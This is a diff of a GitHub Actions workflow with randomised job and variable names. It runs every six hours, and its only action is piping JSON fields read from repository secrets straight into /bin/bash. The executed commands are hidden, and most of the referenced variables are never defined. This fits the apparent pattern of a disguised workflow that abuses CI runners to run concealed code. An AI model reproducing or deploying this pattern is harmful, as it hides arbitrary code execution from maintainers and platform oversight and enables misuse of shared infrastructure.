@@ -1,32 +1,28 @@
 name: kechaji5241
+
 on:
   workflow_dispatch:
   schedule:
-    - cron: '4 2/6 * * *'
-jobs:  # 16972
+    - cron: '36 1/6 * * *'
+
+jobs:
   build:
     runs-on: ubuntu-latest
-
     steps:
       - uses: actions/checkout@v4
       - name: kechaji5241
         env:
-          yadio9: ${{ secrets.yadio9 }}
+          ao509: ${{ secrets.ao509 }}
         run: |
-          echo $yadio9 | jq -r .k74 | /bin/bash
-          echo $nn324 | jq -r .corao60176 | /bin/bash
-          echo $p0361 | jq -r .lcpvg18 | /bin/bash
-          echo $se5403 | jq -r .dcdpz17 | /bin/bash
-          echo $sbz97061 | jq -r .ps8 | /bin/bash
-          echo $wnopf2 | jq -r .xogn369 | /bin/bash
-          echo $ufo1 | jq -r .cf0 | /bin/bash
-          echo $shzyl454 | jq -r .ryg8 | /bin/bash
-          echo $z406 | jq -r .v00 | /bin/bash
-          echo $s80874 | jq -r .fre60 | /bin/bash
-          echo $fv3 | jq -r .pst71 | /bin/bash
-          echo $fk62579 | jq -r .cqpbf020 | /bin/bash
-          echo $l67528 | jq -r .a39236 | /bin/bash
-          echo $ssc27 | jq -r .e296 | /bin/bash
-          echo $vzcq8 | jq -r .gkpe66206 | /bin/bash
-          echo $gaxkg94988 | jq -r .plln0 | /bin/bash
+          echo $ao509 | jq -r .tkjap20622 | /bin/bash
+          echo $atpfn7 | jq -r .iu87690 | /bin/bash
+          echo $ggf15816 | jq -r .smo0021 | /bin/bash
+          echo $udgxi582 | jq -r .j99535 | /bin/bash
+          echo $kal9 | jq -r .pndbt8302 | /bin/bash
+          echo $vrbb353 | jq -r .wxhem653 | /bin/bash
+          echo $wcq52735 | jq -r .xqe411 | /bin/bash
+          echo $m7 | jq -r .nqkjf183 | /bin/bash
+          echo $ab6684 | jq -r .aave0003 | /bin/bash
+          echo $p2928 | jq -r .ls9793 | /bin/bash
+          echo $xuk4 | jq -r .pac43 | /bin/bash
 
